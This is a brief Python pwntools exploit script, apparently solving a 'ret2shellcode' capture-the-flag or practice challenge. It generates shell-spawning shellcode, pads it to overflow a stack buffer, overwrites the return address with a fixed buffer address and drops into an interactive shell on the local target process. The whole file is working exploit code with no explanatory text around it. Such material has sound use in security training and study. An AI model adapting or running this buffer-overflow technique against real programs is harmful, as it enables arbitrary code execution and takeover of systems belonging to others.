#!/usr/bin/env python3
from pwn import *

context.binary = './ret2shellcode'
context.log_level = 'debug'
io = process('./ret2shellcode')

buf2_addr = 0x4040a0
shellcode = asm(shellcraft.sh())

payload = shellcode.ljust(100, b'\x90')  
payload = payload.ljust(120, b'a')       
payload += p64(buf2_addr)                

io.sendline(payload)
io.interactive()